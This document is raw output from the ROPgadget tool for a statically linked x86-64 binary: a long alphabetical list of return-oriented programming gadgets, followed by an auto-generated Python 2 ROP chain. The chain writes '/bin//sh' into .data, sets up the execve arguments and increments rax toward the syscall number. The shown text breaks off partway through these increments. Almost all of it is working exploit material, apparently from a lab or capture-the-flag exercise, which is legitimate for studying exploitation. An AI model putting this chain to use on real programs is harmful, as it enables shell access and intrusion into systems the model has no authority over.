0x00000000004320dd : xchg byte ptr [rsi], cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041c7a3 : xchg byte ptr [rsp + rcx - 0x7cb80000], ch ; ret 0xeb10
0x000000000043c41d : xchg ch, bh ; dec dword ptr [rax - 0x77] ; ret
0x0000000000430c95 : xchg dh, ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042ff95 : xchg dh, ah ; or eax, 0x83480000 ; ret 0x4910
0x000000000042fab5 : xchg dh, al ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004307b5 : xchg dh, al ; add eax, 0x83480000 ; ret 0x4910
0x00000000004318fd : xchg dh, ch ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043111d : xchg dh, cl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041c955 : xchg dl, bh ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041c775 : xchg dl, bl ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041c865 : xchg dl, ch ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041c685 : xchg dl, cl ; or eax, 0x83480000 ; ret 0x4910
0x000000000046cb71 : xchg dl, dl ; add al, byte ptr [rax] ; add byte ptr [rcx - 0x77], al ; ret
0x000000000047d334 : xchg dl, dl ; cli ; call qword ptr [rsi]
0x000000000040fb07 : xchg dword ptr [rax - 0xcfffff8], eax ; ret
0x0000000000467216 : xchg dword ptr [rax], eax ; add eax, dword ptr [rax] ; add bl, dh ; ret
0x000000000044fd6c : xchg dword ptr [rbp - 0x76fffff0], edi ; ret 0x349
0x00000000004597f3 : xchg dword ptr [rbx - 0x76ffffdf], edx ; ret 0x349
0x000000000048f0ac : xchg dword ptr [rcx + 0x79], ecx ; xchg eax, edx ; ret 0xf869
0x000000000047536a : xchg dword ptr [rcx + rax - 8], ecx ; jmp rax
0x000000000043d9cd : xchg dword ptr [rdi], eax ; test eax, eax ; jne 0x43d9cd ; pop rdx ; pop r10 ; ret
0x0000000000450e45 : xchg dword ptr [rdx - 0x76ffffff], ebx ; ret 0x349
0x0000000000464edc : xchg dword ptr [rip - 0x76fffffd], edx ; ret 0xe8c0
0x000000000044a30b : xchg dword ptr [rip - 0xcf78c00], esp ; ret
0x000000000048f24b : xchg dword ptr [rsp + rax + 0x6fa9ce9d], esp ; ret
0x000000000046adf4 : xchg eax, ebp ; and eax, dword ptr [rax] ; add rsp, 8 ; ret
0x000000000046ae9e : xchg eax, ebp ; and eax, dword ptr [rax] ; mov qword ptr [rsi], rax ; ret
0x000000000046ae2d : xchg eax, ebp ; and eax, dword ptr [rax] ; ret
0x0000000000403efb : xchg eax, ebp ; ret
0x0000000000474f50 : xchg eax, ebp ; ret 0x145
0x000000000043bfdc : xchg eax, ebp ; ret 0x3948
0x00000000004136da : xchg eax, ebp ; ret 0x8348
0x0000000000414a6e : xchg eax, ebp ; ret 0xd020
0x0000000000406699 : xchg eax, ebp ; ret 0xd021
0x000000000046488b : xchg eax, ebp ; ret 0xd201
0x00000000004081a2 : xchg eax, ebp ; ret 0xdaf7
0x000000000043eed1 : xchg eax, ebp ; ret 0xe1eb
0x0000000000476aca : xchg eax, ebp ; ret 0xf45
0x000000000040c06d : xchg eax, ebp ; ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; pop rbx ; ret
0x000000000040ee5d : xchg eax, ebp ; sal bh, 0xd8 ; ret
0x0000000000409052 : xchg eax, ebx ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x294c
0x000000000041e5b0 : xchg eax, ebx ; add rcx, r11 ; jmp rcx
0x000000000043638c : xchg eax, ebx ; lea rcx, [r11 + rcx] ; jmp rcx
0x000000000041fd52 : xchg eax, ebx ; lea rdx, [r11 + rdx] ; jmp rdx
0x000000000047d8e9 : xchg eax, ebx ; sti ; call qword ptr [rax]
0x000000000047d8e1 : xchg eax, ebx ; sti ; call rax
0x000000000047d8dd : xchg eax, ebx ; sti ; inc eax ; xchg eax, ebx ; sti ; call rax
0x000000000047d8e5 : xchg eax, ebx ; sti ; push rax ; xchg eax, ebx ; sti ; call qword ptr [rax]
0x0000000000430da1 : xchg eax, ecx ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x000000000042f4cf : xchg eax, ecx ; sub eax, edx ; ret
0x000000000040829f : xchg eax, ecx ; xor byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x0000000000410555 : xchg eax, edi ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret
0x00000000004059e1 : xchg eax, edi ; add rdx, rdi ; jmp rdx
0x000000000047d1d5 : xchg eax, edi ; cli ; jmp rsi
0x0000000000416ad5 : xchg eax, edi ; out 0, al ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x00000000004143c9 : xchg eax, edi ; ret 0x3be9
0x000000000043d6d7 : xchg eax, edi ; ror byte ptr [rdi], 0x92 ; ret 0xd029
0x000000000048f6f8 : xchg eax, edi ; xchg eax, esp ; ret
0x0000000000490fbd : xchg eax, edx ; jae 0x490f9a ; push rsi ; pop rdx ; je 0x490f8f ; ret 0xacfc
0x000000000046db16 : xchg eax, edx ; ret 0x294c
0x000000000046e167 : xchg eax, edx ; ret 0x8949
0x000000000043d6da : xchg eax, edx ; ret 0xd029
0x000000000048f0af : xchg eax, edx ; ret 0xf869
0x00000000004139ea : xchg eax, edx ; ret 0xffff
0x0000000000438efd : xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x000000000047d0d4 : xchg eax, edx ; sahf ; cli ; jmp qword ptr [rdx]
0x000000000047d3bc : xchg eax, edx ; sar edx, 1 ; jmp qword ptr [rdx]
0x000000000047d8c5 : xchg eax, edx ; sti ; call qword ptr [rax]
0x000000000047d8b9 : xchg eax, edx ; sti ; call rax
0x000000000047d8b5 : xchg eax, edx ; sti ; inc eax ; xchg eax, edx ; sti ; call rax
0x000000000047d8bd : xchg eax, edx ; sti ; jmp rax
0x000000000047d8c1 : xchg eax, edx ; sti ; push rax ; xchg eax, edx ; sti ; call qword ptr [rax]
0x000000000047cec4 : xchg eax, edx ; stosb byte ptr [rdi], al ; cli ; jmp qword ptr [rdx]
0x000000000041d42c : xchg eax, edx ; sub eax, edx ; ret
0x000000000041e8b0 : xchg eax, esi ; add byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000426ae3 : xchg eax, esi ; add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x000000000043a4f4 : xchg eax, esi ; add rax, rsi ; jmp rax
0x000000000046ad38 : xchg eax, esi ; and eax, dword ptr [rax] ; ret
0x00000000004142d2 : xchg eax, esi ; cli ; sub byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000047a81a : xchg eax, esi ; dec dword ptr [rax - 0x39] ; ret 0xf400
0x000000000047a7f1 : xchg eax, esi ; dec dword ptr [rax - 0x39] ; ret 0xf6c0
0x000000000047a843 : xchg eax, esi ; dec dword ptr [rax - 0x39] ; ret 0xfc00
0x000000000047a86c : xchg eax, esi ; dec dword ptr [rax - 0x39] ; ret 0xfc60
0x000000000047a895 : xchg eax, esi ; dec dword ptr [rax - 0x39] ; ret 0xfce0
0x000000000047a8be : xchg eax, esi ; dec dword ptr [rax - 0x39] ; ret 0xfda0
0x000000000047a8e7 : xchg eax, esi ; dec dword ptr [rax - 0x39] ; ret 0xfe20
0x000000000047a910 : xchg eax, esi ; dec dword ptr [rax - 0x39] ; ret 0xfe80
0x000000000047a750 : xchg eax, esi ; dec dword ptr [rax - 0x39] ; ret 0xff40
0x000000000041e96d : xchg eax, esi ; lock add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000041e8cb : xchg eax, esi ; nop ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000043af96 : xchg eax, esi ; ret 0xc085
0x000000000049194c : xchg eax, esi ; ret 0xcd11
0x000000000043aff7 : xchg eax, esi ; ret 0xd284
0x000000000041e91c : xchg eax, esi ; rol byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000046ca7b : xchg eax, esi ; rol byte ptr [rbp - 0x75], 0x5f ; adc al, 9 ; ret 0x8b48
0x000000000047ce20 : xchg eax, esi ; scasb al, byte ptr [rdi] ; cli ; jmp qword ptr [rsi]
0x0000000000491b5f : xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x491af0 ; ret 0x48f
0x000000000048f6f9 : xchg eax, esp ; ret
0x000000000043c0ab : xchg eax, esp ; ret 0x2044
0x000000000046ca73 : xchg eax, esp ; ret 0x3d
0x0000000000454d30 : xchg eax, esp ; ret 0x76e9
0x0000000000412350 : xchg eax, esp ; ret 0x7ae9
0x00000000004659b1 : xchg eax, esp ; ret 0x8545
0x000000000046f7d1 : xchg eax, esp ; ret 0x950f
0x0000000000402587 : xchg eax, esp ; ret 0xb60f
0x0000000000438f00 : xchg eax, esp ; ret 0xc085
0x000000000043c3d1 : xchg eax, esp ; ret 0xc221
0x0000000000454aa1 : xchg eax, esp ; ret 0xc931
0x000000000043bee8 : xchg eax, esp ; ret 0xca21
0x00000000004011a3 : xchg eax, esp ; ret 0xd284
0x0000000000441306 : xchg eax, esp ; ret 0xd5e9
0x00000000004543a7 : xchg eax, esp ; ret 0xf45
0x000000000041560a : xchg eax, esp ; ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x73], 0x44 ; ret 0xfff
0x000000000047c685 : xchg eax, esp ; stc ; call rax
0x000000000047c681 : xchg eax, esp ; stc ; jmp qword ptr [rax - 0x2f00066c]
0x000000000047c671 : xchg eax, esp ; stc ; jmp qword ptr [rax]
0x000000000047d909 : xchg eax, esp ; sti ; call qword ptr [rax]
0x000000000047d901 : xchg eax, esp ; sti ; call rax
0x000000000047d905 : xchg eax, esp ; sti ; push rax ; xchg eax, esp ; sti ; call qword ptr [rax]
0x0000000000413ee1 : xchg edx, esp ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000457287 : xchg esi, esp ; sbb byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000048a759 : xlatb ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x000000000041fc19 : xlatb ; add r9, r11 ; jmp r9
0x0000000000461fcf : xlatb ; ja 0x461ffc ; ret
0x0000000000439263 : xlatb ; jb 0x43926e ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000405ccd : xlatb ; jmp rdi
0x0000000000454f60 : xlatb ; jo 0x454f6d ; add byte ptr [rdi + rcx + 0x45], cl ; ret 0xf4c
0x0000000000490123 : xlatb ; jo 0x49019f ; mov ebp, 0xfb67d10d ; ret
0x000000000046f3e2 : xlatb ; mov byte ptr [rsi], al ; jne 0x46f3c8 ; mov rax, rsi ; ret
0x0000000000413410 : xlatb ; pop rbx ; jmp 0x40f6a4
0x000000000041d554 : xlatb ; ret
0x00000000004915c6 : xlatb ; ret 0x4e27
0x000000000045fc37 : xlatb ; ret 0x94c
0x000000000041d53f : xlatb ; ret 0xc085
0x0000000000418060 : xlatb ; ret 0xc148
0x000000000041e1c4 : xlatb ; ret 0xe883
0x0000000000432d14 : xlatb ; ret 0xf66
0x000000000041e388 : xlatb ; ret 0xff2d
0x000000000041d921 : xlatb ; rol byte ptr [rbp + 0x664975c0], 0xf ; xlatb ; ret 0xc085
0x000000000045fde5 : xlatb ; rol ch, cl ; std ; xlatb ; ret
0x000000000041d703 : xlatb ; rol dword ptr [rbp + 0x315775c0], 0xc0 ; ret
0x000000000041dc42 : xlatb ; rol dword ptr [rbp - 0x3a378a40], 0xfd ; xlatb ; ret 0xc085
0x0000000000432a92 : xlatb ; rol dword ptr [rbp - 0x3a678a40], 0xfd ; xlatb ; ret 0xc085
0x0000000000436eb6 : xlatb ; ror dword ptr [rcx], cl ; ret 0xe074
0x0000000000417f46 : xlatb ; sal bh, 1 ; ret 0x8000
0x0000000000417e06 : xlatb ; sal bh, 1 ; ret 0xc000
0x0000000000417cc6 : xlatb ; sal bh, 1 ; ret 0xe000
0x0000000000417b86 : xlatb ; sal bh, 1 ; ret 0xf000
0x0000000000417a46 : xlatb ; sal bh, 1 ; ret 0xf800
0x0000000000417906 : xlatb ; sal bh, 1 ; ret 0xfc00
0x00000000004177c6 : xlatb ; sal bh, 1 ; ret 0xfe00
0x0000000000417686 : xlatb ; sal bh, 1 ; ret 0xff00
0x0000000000417546 : xlatb ; sal bh, 1 ; ret 0xff80
0x0000000000417406 : xlatb ; sal bh, 1 ; ret 0xffc0
0x00000000004172c6 : xlatb ; sal bh, 1 ; ret 0xffe0
0x0000000000417186 : xlatb ; sal bh, 1 ; ret 0xfff0
0x0000000000417046 : xlatb ; sal bh, 1 ; ret 0xfff8
0x0000000000416f06 : xlatb ; sal bh, 1 ; ret 0xfffc
0x0000000000416dc6 : xlatb ; sal bh, 1 ; ret 0xfffe
0x0000000000436eb2 : xlatb ; shl byte ptr [rsi + 0xf], 0xd7 ; ror dword ptr [rcx], cl ; ret 0xe074
0x000000000045fbd5 : xlatb ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x000000000045fbe6 : xlatb ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret 0xf66
0x000000000047df31 : xlatb ; sti ; call qword ptr [rdx]
0x000000000047de8d : xlatb ; sti ; call rsp
0x000000000047e011 : xlatb ; sti ; jmp qword ptr [rsi]
0x000000000047df85 : xlatb ; sti ; jmp rsp
0x0000000000416aba : xor ah, byte ptr [rdi] ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x000000000049736d : xor al, 0 ; add al, ah ; jle 0x497372 ; call qword ptr [rax]
0x0000000000497395 : xor al, 0 ; add byte ptr [rax - 0x66], ch ; stc ; call qword ptr [rax]
0x000000000048f0aa : xor al, 0x19 ; xchg dword ptr [rcx + 0x79], ecx ; xchg eax, edx ; ret 0xf869
0x00000000004498b2 : xor al, 0x88 ; add rsi, r8 ; jmp rsi
0x000000000045c1e3 : xor al, 0xbe ; add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, rbx ; call rax
0x0000000000478002 : xor al, 0xcb ; mov rsi, qword ptr [r14] ; call r12
0x000000000049028a : xor al, 0xd8 ; ret
0x0000000000448cdd : xor al, 0xf8 ; test rsi, rsi ; je 0x448ced ; call rsi
0x000000000047d7c9 : xor al, 0xfb ; jmp rax
0x000000000043a4e6 : xor al, 4 ; add cl, al ; call 0xffffffff84062e02
0x00000000004971ad : xor al, byte ptr [rax] ; add byte ptr [rax], al ; jo 0x4971b1 ; call rsp
0x000000000046ff32 : xor al, byte ptr [rdx + 0x23] ; add byte ptr [rax - 0x39], cl ; ret 0xffff
0x00000000004630f2 : xor al, ch ; mov al, 0xd3 ; stc ; dec dword ptr [rax + 0x39] ; ret
0x000000000047d7c5 : xor bh, bl ; call qword ptr [rax]
0x000000000047d748 : xor bh, dh ; cli ; call rax
0x000000000047c895 : xor bh, dl ; jmp qword ptr [rsi]
0x000000000041d78c : xor bl, al ; nop ; xor eax, eax ; ret
0x000000000047d7c1 : xor bl, bh ; push qword ptr [rax + 0x32] ; sti ; call qword ptr [rax]
0x000000000040f726 : xor bl, dh ; ret
0x000000000041d65d : xor byte ptr [r14 + 0xf], r12b ; xlatb ; ret
0x00000000004092b2 : xor byte ptr [r8 + 1], r9b ; ret 0x8b49
0x00000000004324c1 : xor byte ptr [rax + 0xf], cl ; ret 0x90c3
0x0000000000432922 : xor byte ptr [rax + 0xf], cl ; ret 0xf8c5
0x00000000004092b3 : xor byte ptr [rax + 1], cl ; ret 0x8b49
0x0000000000497b6c : xor byte ptr [rax + rax], bh ; add byte ptr [rax + 0x3b], dh ; cli ; jmp qword ptr [rcx]
0x000000000049736c : xor byte ptr [rax + rax], dh ; add al, ah ; jle 0x497373 ; call qword ptr [rax]
0x000000000043307f : xor byte ptr [rax - 0x77], cl ; add cl, byte ptr [rax - 0x7d] ; ret 0x4808
0x000000000046095f : xor byte ptr [rax - 0x77], cl ; out dx, eax ; call rbx
0x0000000000474eb8 : xor byte ptr [rax - 0x77], cl ; ret 0x2148
0x00000000004422df : xor byte ptr [rax - 0x7d], cl ; ret
0x000000000043ed1f : xor byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000040960b : xor byte ptr [rax], 1 ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x0000000000406ef9 : xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x0000000000406e33 : xor byte ptr [rax], al ; add byte ptr [rax], al ; call rdx
0x0000000000460bac : xor byte ptr [rax], al ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x0000000000406f1f : xor byte ptr [rax], al ; add byte ptr [rax], al ; mov rdi, qword ptr [rax + 0x20] ; call rdx
0x000000000043a543 : xor byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000045dfea : xor byte ptr [rax], al ; je 0x45dff5 ; ret
0x000000000040df28 : xor byte ptr [rbp + 0x25], 0x5b ; ret
0x000000000047841e : xor byte ptr [rbp + 0x27], dh ; mov rax, qword ptr [rsi + 0x10] ; ret
0x00000000004394b5 : xor byte ptr [rbp + 0xf], al ; adc dword ptr [rbx], eax ; ret
0x0000000000415765 : xor byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000044105a : xor byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000045610c : xor byte ptr [rbx - 0x2e89f607], al ; mov qword ptr [rdi], rsi ; ret
0x000000000049b080 : xor byte ptr [rbx - 4], ch ; jmp qword ptr [rcx]
0x0000000000474cd5 : xor byte ptr [rcx + 0x21], cl ; ror byte ptr [rax + 0x21], cl ; ret 0xc148
0x00000000004161f6 : xor byte ptr [rcx - 0x73], cl ; je 0x416208 ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x0000000000412a6d : xor byte ptr [rcx - 0x75], cl ; push rcx ; or dh, dh ; ret 0xf04
0x000000000040960c : xor byte ptr [rcx], al ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x000000000040a647 : xor byte ptr [rcx], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00000000004082a0 : xor byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x000000000047d7bc : xor byte ptr [rdi], ch ; sti ; call rax
0x000000000045db80 : xor byte ptr [rdi], cl ; ret 0x4389
0x000000000047d79c : xor byte ptr [rdx], ah ; sti ; call rax
0x0000000000415d02 : xor byte ptr [rdx], al ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x0000000000496492 : xor byte ptr [rdx], al ; ret
0x0000000000400d98 : xor byte ptr [rdx], ch ; add bh, dh ; ret 0
0x00000000004983c7 : xor byte ptr [rsi + 0x380e4106], al ; add dword ptr [rdi], 3 ; ret 0xa01
0x000000000041e65f : xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000045fb9c : xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x000000000041d65e : xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x000000000049ac40 : xor byte ptr [rsi - 4], cl ; jmp rdx
0x000000000049c821 : xor ch, bh ; jmp qword ptr [rdx]
0x0000000000469773 : xor cl, byte ptr [rax - 0x7d] ; ret 0x4810
0x000000000047356a : xor cl, byte ptr [rax - 0x7d] ; ret 0xf08
0x00000000004774ae : xor cl, byte ptr [rax] ; jne 0x4774d3 ; mov rax, qword ptr [rax] ; ret
0x0000000000449c45 : xor dh, dh ; ret 0x4002
0x000000000047c909 : xor dl, bh ; push qword ptr [rbx] ; xor edx, edi ; call rbx
0x000000000046baee : xor dl, dh ; jmp r11
0x000000000046bc00 : xor dl, dh ; ret
0x0000000000453f5d : xor dword ptr [rax - 0x77], ecx ; ror dword ptr [rax - 0x77], 1 ; ret 0x27e9
0x000000000043de0f : xor dword ptr [rax - 0x7d], ecx ; ret 0xf01
0x0000000000497135 : xor dword ptr [rax], eax ; add byte ptr [rax], bh ; movsxd rdi, eax ; jmp qword ptr [rbx]
0x000000000047751d : xor dword ptr [rax], ecx ; jne 0x47752c ; mov qword ptr [rax], rdx ; ret
0x000000000043ddee : xor dword ptr [rax], edi ; ret 0x2d75
0x0000000000411969 : xor dword ptr [rbx - 0x76b7f020], eax ; ret 0x8948
0x000000000044d76e : xor dword ptr [rcx], eax ; add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret
0x0000000000416861 : xor dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x000000000043b114 : xor dword ptr [rsi], esp ; add byte ptr [rax + 0x39], cl ; ret
0x0000000000439a73 : xor eax, 0x48000002 ; mov ecx, edx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00000000004974ad : xor eax, 0xecc00000 ; stc ; jmp qword ptr [rbx]
0x0000000000406ef6 : xor eax, dword ptr [0x30] ; call rax
0x000000000040caa0 : xor eax, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x0000000000414ef6 : xor eax, eax ; add rsp, 0x18 ; ret
0x000000000040d3c4 : xor eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000044b1b9 : xor eax, eax ; add rsp, 8 ; ret
0x0000000000471d9a : xor eax, eax ; call 0x469eb8
0x0000000000461fcb : xor eax, eax ; cmp rdi, rdx ; ja 0x462000 ; ret
0x000000000043d9a7 : xor eax, eax ; cmp rdx, rdi ; setae al ; ret
0x000000000040bf80 : xor eax, eax ; jmp 0x40bf4a
0x000000000045e904 : xor eax, eax ; jmp 0x45e8d1
0x000000000045f982 : xor eax, eax ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000040551f : xor eax, eax ; pop rbp ; pop r12 ; ret
0x000000000040c02b : xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000407205 : xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004138c2 : xor eax, eax ; pop rbx ; pop rbp ; ret
0x000000000040ad82 : xor eax, eax ; pop rbx ; ret
0x000000000040714d : xor eax, eax ; ret
0x000000000041826e : xor eax, eax ; sub eax, ecx ; ret
0x000000000046238e : xor eax, eax ; test ecx, ecx ; jne 0x462384 ; ret
0x000000000041db4c : xor eax, eax ; vzeroupper ; ret
0x0000000000401b20 : xor ebp, ebp ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000049c839 : xor ebp, edi ; jmp rdx
0x00000000004486d6 : xor ebx, ebx ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004069f3 : xor ecx, dword ptr [rax + 0x39] ; ret
0x00000000004019a4 : xor ecx, dword ptr [rax - 0x77] ; fucomip st(0) ; ret
0x00000000004430c9 : xor ecx, dword ptr [rax - 0x7d] ; ret
0x0000000000447a39 : xor ecx, ecx ; call r15
0x0000000000460769 : xor ecx, ecx ; xor edx, edx ; lea r9, [rsp + 0x20] ; call rbx
0x0000000000406e30 : xor edx, dword ptr [0x30] ; call rdx
0x000000000047c90d : xor edx, edi ; call rbx
0x00000000004402a3 : xor edx, edx ; add eax, 1 ; push rax ; call rbx
0x000000000043eecc : xor edx, edx ; cmp ebx, eax ; setne dl ; jmp 0x43eebc
0x000000000045cec3 : xor edx, edx ; div r13 ; mov rbp, rax ; jmp 0x45ce98
0x000000000040dc33 : xor edx, edx ; jmp rax
0x000000000046076b : xor edx, edx ; lea r9, [rsp + 0x20] ; call rbx
0x0000000000414464 : xor edx, edx ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x0000000000414770 : xor edx, edx ; pop rbx ; mov rax, rdx ; pop rbp ; pop r12 ; ret
0x000000000047c90c : xor esi, dword ptr [rcx] ; cli ; call rbx
0x0000000000447a38 : xor r9d, r9d ; call r15
0x0000000000406ef5 : xor rax, qword ptr [0x30] ; call rax
0x0000000000406ef4 : xor rax, qword ptr fs:[0x30] ; call rax
0x0000000000436ed0 : xor rax, rax ; ret
0x0000000000406e2f : xor rdx, qword ptr [0x30] ; call rdx
0x0000000000406e2e : xor rdx, qword ptr fs:[0x30] ; call rdx

Unique gadgets found: 8369

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x40f811 mov qword ptr [rsi], rcx ; ret
	[+] Gadget found: 0x405895 pop rsi ; ret
	[-] Can't find the 'pop rcx' gadget. Try with another 'mov [reg], reg'

	[+] Gadget found: 0x46aea1 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x405895 pop rsi ; ret
	[+] Gadget found: 0x43b97c pop rax ; ret
	[+] Gadget found: 0x436ed0 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x436ed0 xor rax, rax ; ret
	[+] Gadget found: 0x4610a0 add rax, 1 ; ret
	[+] Gadget found: 0x4610a1 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x4005f6 pop rdi ; ret
	[+] Gadget found: 0x405895 pop rsi ; ret
	[+] Gadget found: 0x43b9d5 pop rdx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x461645 syscall ; ret

- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
	p += pack('<Q', 0x00000000006a10e0) # @ .data
	p += pack('<Q', 0x000000000043b97c) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
	p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
	p += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x00000000004005f6) # pop rdi ; ret
	p += pack('<Q', 0x00000000006a10e0) # @ .data
	p += pack('<Q', 0x0000000000405895) # pop rsi ; ret
	p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
	p += pack('<Q', 0x000000000043b9d5) # pop rdx ; ret
	p += pack('<Q', 0x00000000006a10e8) # @ .data + 8
	p += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004610a0) # add rax, 1 ; ret
